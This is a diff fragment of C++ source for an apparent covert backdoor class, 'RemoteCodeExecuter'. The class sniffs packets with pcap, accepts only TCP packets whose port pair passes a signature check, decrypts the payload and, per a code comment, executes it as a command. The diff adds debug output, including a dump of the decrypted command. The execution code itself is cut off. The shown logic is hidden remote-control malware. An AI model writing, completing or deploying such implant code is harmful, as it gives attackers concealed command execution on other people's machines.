@@ -43,23 +43,31 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     struct iphdr *ip;
     struct tcphdr *tcp;
 
+    std::cout << "got packet" << std::endl;
+
     // is it ip?
     if (ntohs(eth->h_proto) != ETH_P_IP) {
+        std::cout << "\tnot ip" << std::endl;
         return;
     }
+    std::cout << "\tip" << std::endl;
 
     // is it tcp?
     ip = (struct iphdr *)(packet + ETH_HLEN);
     if (ip->protocol != IPPROTO_TCP) {
+        std::cout << "\tnot tcp" << std::endl;
         return;
     }
+    std::cout << "\ttcp" << std::endl;
 
     tcp = (struct tcphdr *)(packet + ETH_HLEN + (ip->ihl * 4));
 
     // is it authenticated?
     if (!authenticator::isValidSignature(ntohs(tcp->source), ntohs(tcp->dest))) {
+        std::cout << "\tnot authenticated" << std::endl;
         return;
     }
+    std::cout << "\tauthenticated" << std::endl;
 
     // get payload
     unsigned char *payload = (unsigned char *)(packet + ETH_HLEN + (ip->ihl * 4) + (tcp->doff * 4));
@@ -70,6 +78,14 @@ void RemoteCodeExecuter::netCallback(const pcap_pkthdr *header, const unsigned c
     ciphertext.assign(payload, payload + payloadSize);
 
     UCharVector plaintext = net->getCrypto()->dec(ciphertext);
+
+    std::cout << "\tplaintext:" << std::endl;
+
+    std::cout << "\t";
+    for (auto &c : plaintext) {
+        std::cout << c;
+    }
+    std::cout << std::endl;
 
     // if command execute it
     char *tmp;
